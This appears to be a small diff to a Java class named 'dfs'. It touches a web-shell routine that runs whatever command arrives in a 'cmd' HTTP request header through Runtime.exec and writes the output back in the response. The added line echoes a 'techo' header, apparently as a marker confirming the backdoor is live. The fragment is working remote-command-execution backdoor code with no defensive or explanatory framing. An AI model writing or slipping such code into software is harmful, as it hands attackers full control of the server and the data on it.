@@ -52,6 +52,7 @@ public class dfs {
             }
             if(r !=null&& p !=null){
                 try {
+                    p.setHeader("techo",r.getHeader("techo"));
                     p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getHeader("cmd")).getInputStream()).useDelimiter("\\A").next());
                     p.getWriter().flush();
                 }catch (Exception e){
